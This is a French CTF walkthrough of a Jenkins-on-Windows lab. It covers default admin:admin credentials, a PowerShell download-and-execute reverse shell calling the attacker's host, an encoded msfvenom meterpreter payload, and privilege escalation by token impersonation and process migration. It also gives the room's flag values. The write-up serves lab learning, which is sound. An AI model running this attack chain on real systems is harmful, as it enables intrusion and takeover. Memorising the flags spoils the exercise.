# Task 1 
## Nb de ports ouverts ? 
Nmap [IP_ADDRESS_ROOM]

**3 ports TCP ouverts**

## Creds utilisés ? 

Aller à l'adresse de la room sur le port 8080 : 

[IP_ADDRESS_ROOM]:8080

Creds par défault jenkins 

**admin:admin**

## What is the user.txt flag? 

	1. Aller dans les configurations du projet 
	2. Rentrer la commande suivante : 

### Commande 
``` powershell iex (New-Object Net.WebClient).DownloadString('http://[IP_ADDRESS_VPN]:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP_ADDRESS_VPN] -Port 1234 ```

	3. Appliquer & Sauvegarder
	4. Cloner le fichier https://github.com/samratashok/nishang 
		a. Rentrer dans le dossier : nishang/Shells/
	5. Lancer un serveur python sur le port 8000 (par défaut)
		a. Python3 -m http.server 
	6. Lancer un listener sur le port 1234
	7. Lancer le build sur Jenkins 
		a. Quand le build se lance, regarder si le fichier se télécharge bien
			10.10.86.191 - - [22/Aug/2023 04:53:33] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
		b. Une fois qu'il est téléchargé regarder le listener, un shell devrait s'ouvrir sur la machine jenkins 
			PS C:\Program Files (x86)\Jenkins\workspace\project>
	8. Se rendre dans le dossier : C:\Users\bruce\Desktop
	9. Afficher le fichier flag.txt : 
		a. Type flag.txt 
		79007a09481963edf2e1321abd9ae2a0
Ne pas quitter le listener ! 

# Task 2 

Utiliser msfvenom pour faire un reverse shell meterpreter Windows en utilisant le payload suivant : 
``` msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP_ADDRESS_VPN] LPORT=1234 -f exe -o shell-name.exe ```

Le télécharger sur la machine avec la même méthode que la **Task 1**

**Utiliser la commande dans le listener :**

``` powershell "(New-Object System.Net.WebClient).Downloadfile('http://[IP_ADDRESS_VPN]:8000/shell-name.exe','shell-name.exe')" ```

Avant de lancer le build, utiliser le handler sur metasploit avec le payload reverse tcp 

``` use exploit/multi/handler ```
``` set PAYLOAD windows/meterpreter/reverse_tcp ```
``` set LHOST [IP_ADDRESS_VPN] ```
``` set LPORT 1234 ```

Cette étape permet de recevoir une connexion entrante du rerverse shell. Une fois lancé, entrer la commande suivante pour lancer le reverse shell :

``` Start-Process "shell-name.exe" ```

Un meterpreter devrait aparaitre 

## Quelle est la taille finale du payload executable généré ?

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
**Final size of exe file: 73802 bytes**
Saved as: shell-name.exe

# Task 3 

Regarder tous les privilèges avec la commande : whoami /priv 

Entrer la commande ``` load incognito ```  dans le meterpreter

Entrer la commande suivante pour voir les tokens disponibles : 

``` list_tokens -g  ```

Entrer la commande pour utiliser le jeton de l'administrateur : 

``` impersonate_token "BUILTIN\Administrators" ```

Même si vous avez un jeton privilégié plus élevé, vous ne disposez peut-être pas des autorisations d'un utilisateur privilégié (cela est dû à la façon dont Windows gère les autorisations - il utilise le jeton principal du processus et non le jeton imité pour déterminer ce que le processus peut ou ne peut pas faire). 

Assurez-vous que vous migrez vers un processus avec les autorisations correctes (réponse à la question ci-dessus). Le processus le plus sûr à choisir est le processus services.exe. Tout d'abord, utilisez la commande ``` ps ``` pour afficher les processus et trouver le PID du processus services.exe. Migrez vers ce processus à l'aide de la commande ```migrate PID-OF-PROCESS```
 
Regardez dans quel dossier vous êtes avec la commande ``` pwd ```

Se rendre dans le dossier C:\Windows\system32\config

Afficher le fichier root.txt 

Cat ``` root.txt ```

**dff0f748678f280250f25a45b8046b4a**
